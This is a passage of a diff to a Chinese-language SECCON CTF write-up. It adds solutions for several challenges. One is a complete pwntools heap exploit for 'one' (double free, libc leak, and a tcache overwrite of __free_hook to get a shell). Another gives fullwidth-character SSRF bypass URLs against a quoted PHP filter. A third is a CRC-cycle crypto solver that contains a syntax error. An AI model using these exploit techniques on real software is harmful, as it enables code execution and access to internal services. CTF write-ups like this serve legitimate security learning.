@@ -116,7 +116,90 @@ username=aidai&amount=500&proof=MJFPi+KmhuQdJ945Td6b4gSuUxbH535aogkELbMGBmwHMSAw
 
 
 
+## one
 
+只能free memo指向的块，存在double free和uaf
+
+double free后show拿白给堆地址，搞出0x91一波free进unsorted bin拿libc，然后tcache attack写free_hook
+
+```python
+from pwn import *
+#=r = remote('one.chal.seccon.jp',18357)
+r = process('./one')
+elf = ELF('./one')
+libc = ELF('./libc-2.27.so')
+
+def add(memo):
+	r.recvuntil('> ')
+	r.sendline('1')
+	r.recvuntil('> ')
+	r.sendline(memo)
+
+def show():
+	r.recvuntil('> ')
+	r.sendline('2')
+
+
+def free():
+	r.recvuntil('> ')
+	r.sendline('3')
+
+add('fuck')
+
+free()
+free()
+free()
+free()
+
+show()
+
+a = r.recvuntil('\nDone',drop = True)
+heap_ptr = u64(a.ljust(8,'\x00'))
+log.info(hex(heap_ptr))
+add(p64(0))
+add('fuck')
+add(p64(heap_ptr)+p64(0x91)+p64(heap_ptr))
+add('fuck')
+add('fuck')
+add('fuck')
+
+free()
+free()
+add(p64(heap_ptr + 0x60))
+add('fuck')
+add('fuck')
+
+free()
+free()
+free()
+free()
+free()
+free()
+free()
+free()
+show()
+
+a = r.recvuntil('\nDone',drop = True)
+libc_base = u64(a.ljust(8,'\x00')) - 0x3ebca0
+free_hook = libc_base + libc.symbols['__free_hook']
+one = libc_base + 0x4f322
+log.success('libc_base: ' + hex(libc_base))
+log.success('__free_hook: ' + hex(free_hook))
+log.success('one: ' + hex(one))
+
+add('fuck')
+free()
+free()
+
+add(p64(free_hook))
+add('fuck')
+add(p64(one))
+free()
+
+r.interactive()
+```
+
+running tql
 
 ## lazy
 
@@ -416,4 +499,118 @@ SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}
 ```
 
 
+
+
+
+## Option-Cmd-U
+
+```
+                    <?php
+                    if (isset($_GET['url'])){
+                        $url = filter_input(INPUT_GET, 'url');
+                        $parsed_url = parse_url($url);                        
+                        if($parsed_url["scheme"] !== "http"){
+                            // only http: should be allowed. 
+                            echo 'URL should start with http!';
+                        } else if (gethostbyname(idn_to_ascii($parsed_url["host"], 0, INTL_IDNA_VARIANT_UTS46)) === gethostbyname("nginx")) {
+                            // local access to nginx from php-fpm should be blocked.
+                            echo 'Oops, are you a robot or an attacker?';
+                        } else {
+                            // file_get_contents needs idn_to_ascii(): https://stackoverflow.com/questions/40663425/
+                            highlight_string(file_get_contents(idn_to_ascii($url, 0, INTL_IDNA_VARIANT_UTS46),
+                                                               false,
+                                                               stream_context_create(array(
+                                                                   'http' => array(
+                                                                       'follow_location' => false,
+                                                                       'timeout' => 2
+                                                                   )
+                                                               ))));
+                        }
+                    }
+                    ?>
+```
+
+```
+http://nginx／flag.php
+http://nginx：80/flag.php
+```
+
+
+
+## Crazy repetition of codes
+
+```python
+import os
+from Crypto.Cipher import AES
+
+def crc32(crc, data):
+  crc = 0xFFFFFFFF ^ crc
+  for c in data:
+    crc = crc ^ ord(c)
+    for i in range(8):
+      crc = (crc >> 1) ^ (0xEDB88320 * (crc & 1))
+  return 0xFFFFFFFF ^ crc
+
+key = b""
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "TSG")
+crc = 0xb09bc54f
+key += crc.to_bytes(4, byteorder='big')
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "is")
+key += crc.to_bytes(4, byteorder='big')
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "here")
+key += crc.to_bytes(4, byteorder='big')
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "at")
+key += crc.to_bytes(4, byteorder='big')
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "SECCON")
+key += crc.to_bytes(4, byteorder='big')
+
+crc = 0
+for i in range(int("1" * 10000)):
+  crc = crc32(crc, "CTF!")
+key += crc.to_bytes(4, byteorder='big')
+
+flag = os.environ['FLAG']
+assert(len(flag) == 32)
+
+aes = AES.new(key, AES.MODE_ECB)
+encoded = aes.encrypt(flag)
+assert(encoded.hex() == '79833173d435b6c5d8aa08f790d6b0dc8c4ef525823d4ebdb0b4a8f2090ac81e')
+```
+
+crc32在最多2^32次后必循环，找出执行多少次循环后用int("1" * 10000)取余
+
+死在了不知道zlib.crc32，用给出的crc32()跑慢到去世，血亏
+
+```python
+import zlib
+
+def fuck(str)
+	crc = 0
+	i=0
+	while True:
+		i+=1
+		if i % 100000 == 0:
+			print(i)
+		crc = zlib.crc32(str,crc)
+		if crc == 0:
+			print('gg')
+			print(i)
+	return int("1" * 10000)%i
+
+```
 
